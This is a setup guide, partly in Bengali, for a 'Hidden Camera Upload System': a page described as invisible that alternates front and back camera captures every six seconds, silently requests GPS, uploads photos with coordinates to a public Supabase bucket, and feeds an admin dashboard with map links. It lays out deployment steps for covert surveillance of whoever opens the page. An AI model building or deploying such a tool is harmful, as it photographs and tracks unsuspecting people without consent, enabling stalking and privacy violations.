# Hidden Camera Upload System
### Setup Guide

---

## ✅ Step 1 — Supabase Storage Bucket

1. Supabase Dashboard → **Storage**
2. **New Bucket** → Name: `photos`
3. **Public bucket** → ✅ Enable
4. **Save**

---

## ✅ Step 2 — RLS Policies

1. Supabase Dashboard → **SQL Editor** → **New Query**
2. `policies.sql` ফাইলের সব কোড paste করো
3. **Run** চাপো

---

## ✅ Step 3 — Admin User তৈরি করো

1. Supabase Dashboard → **Authentication** → **Users**
2. **Add User** → **Create new user**
3. Email + Password দাও
4. **Create User**

---

## ✅ Step 4 — Deploy করো

তিনটা ফাইল যেকোনো HTTPS host এ upload করো:

| Platform | কীভাবে |
|----------|--------|
| **Netlify** | netlify.com → drag & drop ফোল্ডার |
| **Vercel** | vercel.com → import করো |
| **GitHub Pages** | repo → Settings → Pages |

> ⚠️ **HTTPS আবশ্যক** — camera API শুধু HTTPS এ কাজ করে

---

## 📁 File Summary

| File | কাজ |
|------|-----|
| `index.html` | Capture page — invisible, alternates front/back camera every 6s |
| `login.html` | Admin login |
| `admin.html` | Dashboard — view, delete photos with location info |
| `policies.sql` | Supabase RLS policies |

---

## 🔄 How index.html Works

```
Boot → Request location permission (silent)
     ↓
Front camera open → warmup 1.8s → capture → upload → close
     ↓  (6s later)
Back camera open  → warmup 1.8s → capture → upload → close
     ↓  (6s later)
Front camera open → ... (repeat forever)
```

Filename format:
```
{timestamp}_front_{lat}_{lng}_{acc}m.jpg   ← with GPS
{timestamp}_back_noloc.jpg                 ← without GPS
```

---

## 🖼️ Admin Panel Features

- ✅ All photos in responsive grid
- ✅ Front / Back camera badge on each photo
- ✅ 📍 Location icon if GPS available
- ✅ Click photo → Lightbox with full metadata
- ✅ Google Maps link from lightbox
- ✅ Delete button on each card (hover)
- ✅ Delete from lightbox
- ✅ Confirm dialog before delete
- ✅ Newest / Oldest sort
- ✅ Logout
